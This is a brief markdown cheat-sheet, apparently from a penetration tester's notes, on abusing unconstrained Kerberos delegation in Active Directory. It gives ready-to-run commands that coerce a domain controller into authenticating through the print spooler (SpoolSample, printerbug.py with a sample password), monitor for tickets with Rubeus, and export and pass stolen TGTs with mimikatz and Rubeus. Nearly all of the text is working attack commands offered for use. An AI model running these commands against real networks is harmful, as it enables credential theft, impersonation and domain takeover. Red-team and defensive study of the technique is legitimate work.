---
title: Unconstrained
enableToc: "true"
tags:
  - unconstrained
  - delegations
  - activedirectory
---
### Printer Bug
Using spooler service to authenticate between domain computers(that runs spooler svc). Attackers can monitor incoming tickets with `Rubeus`.

1. Verify that remote computer has spooler service running
```powershell
ls \\dc01.contoso.local\pipe\spoolss
```

2. Download spoolsample [here](https://github.com/leechristensen/SpoolSample) and run the following command to authenticate and capture ticket.
```powershell
# run this on domain joined computers
spoolsample.exe dc01.contoso.local ms01.contoso.local
# or can use this command for linux workstation
python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128

# monitor ticket
Rubeus.exe monitor /interval:5
```

### Extract TGT
Since unconstrained computers will save users tgt (logged in users). We will extract this keys and able to impersonate them.
```powershell
mimikatz# sekurlsa::tickets /export
Rubeus.exe ptt /ticket:ticket.kirbi
```

>[!References]
>- https://www.thehacker.recipes/a-d/movement/kerberos/delegations/unconstrained
>- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/